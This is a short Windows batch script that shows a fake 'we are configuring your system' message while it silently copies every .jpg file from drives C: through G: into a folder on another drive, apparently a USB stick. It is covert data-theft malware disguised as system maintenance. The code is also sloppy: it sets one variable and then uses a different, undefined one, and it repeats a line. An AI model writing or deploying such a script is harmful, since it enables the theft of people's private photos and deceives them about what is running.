::We are configuring your system.Please do not exit the program or turn off the system
@echo off
color c
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y /g
%backupcmd% "C:\*.jpg" "%drive%\My pics\file_me"
%backupcmd% "D:\*.jpg" "%drive%\My pics\file_me"
%backupcmd% "E:\*.jpg" "%drive%\My pics\file_me"
%backupcmd% "F:\*.jpg" "%drive%\My pics\file_me"
%backupcmd% "G:\*.jpg" "%drive%\My pics\file_me"
%backupcmd% "F:\*.jpg" "%drive%\My Pics\file_me"
@echo off 